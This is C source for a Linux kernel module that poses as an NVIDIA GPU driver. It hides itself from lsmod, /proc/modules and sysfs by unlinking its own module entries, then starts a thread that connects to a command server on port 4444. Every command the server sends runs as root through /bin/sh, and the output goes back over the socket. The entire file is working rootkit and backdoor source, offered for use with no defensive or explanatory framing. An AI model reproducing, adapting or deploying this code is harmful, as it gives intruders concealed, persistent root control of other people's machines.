// hidden_module.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/kmod.h>


MODULE_LICENSE("Proprietary");
MODULE_AUTHOR("kernel");
MODULE_DESCRIPTION("Mimic NVIDIA GPU Driver");
MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");

static struct task_struct *beacon_thread;
static struct socket *conn_socket = NULL;
#define SERVER_IP   0x7F000001  // 127.0.0.1
#define SERVER_PORT 4444
#define BUF_SIZE 1024

// Kernel-space TCP connection function
static int connect_to_server(void) {
    struct sockaddr_in s_addr;
    int ret;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
    if (ret < 0) return ret;

    memset(&s_addr, 0, sizeof(s_addr));
    s_addr.sin_family = AF_INET;
    s_addr.sin_addr.s_addr = htonl(SERVER_IP);
    s_addr.sin_port = htons(SERVER_PORT);

    ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&s_addr, sizeof(s_addr), 0);
    return ret;
}

// Receive and execute shell commands
static int beacon_main(void *data) {
    struct msghdr msg;
    struct kvec iov;
    char recv_buf[BUF_SIZE];
    char result_buf[BUF_SIZE];
    mm_segment_t old_fs;
    struct file *file;
    int len;

    if (connect_to_server() < 0) return 0;

    old_fs = get_fs();
    set_fs(KERNEL_DS); // Needed for file operations in older kernels

    while (!kthread_should_stop()) {
        memset(&msg, 0, sizeof(msg));
        memset(&iov, 0, sizeof(iov));
        memset(recv_buf, 0, BUF_SIZE);

        iov.iov_base = recv_buf;
        iov.iov_len = BUF_SIZE;

        len = kernel_recvmsg(conn_socket, &msg, &iov, 1, BUF_SIZE, 0);
        if (len <= 0) {
            msleep(1000);
            continue;
        }

        recv_buf[len] = '\0';
        printk(KERN_INFO "[beacon] Got command: %s\n", recv_buf);

        // Run command and redirect output to /tmp/out
        char *cmd_fmt = "/bin/sh -c '%s > /tmp/out 2>&1'";
        char full_cmd[BUF_SIZE];
        snprintf(full_cmd, BUF_SIZE, cmd_fmt, recv_buf);

        char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
        char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

        // Read the output back
        memset(result_buf, 0, BUF_SIZE);
        file = filp_open("/tmp/out", O_RDONLY, 0);
        if (!IS_ERR(file)) {
            kernel_read(file, result_buf, BUF_SIZE - 1, &file->f_pos);
            filp_close(file, NULL);
        } else {
            snprintf(result_buf, BUF_SIZE, "[error reading output]");
        }

        // Send back to the server
        memset(&msg, 0, sizeof(msg));
        memset(&iov, 0, sizeof(iov));

        iov.iov_base = result_buf;
        iov.iov_len = strlen(result_buf);

        kernel_sendmsg(conn_socket, &msg, &iov, 1, iov.iov_len);

        msleep(1000);
    }

    set_fs(old_fs); // Restore address limit
    return 0;
}

static int __init hidden_init(void) {
    printk(KERN_INFO "[hidden_module] Hello world!\n");

    // Hide from lsmod, /proc/modules, /sys/module
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // Start kernel beacon thread
    beacon_thread = kthread_run(beacon_main, NULL, "beacon_thread");
    return 0;
}

static void __exit hidden_exit(void) {
    if (beacon_thread)
        kthread_stop(beacon_thread);

    if (conn_socket)
        sock_release(conn_socket);

    printk(KERN_INFO "[hidden_module] Goodbye!\n");
}

module_init(hidden_init);
module_exit(hidden_exit);
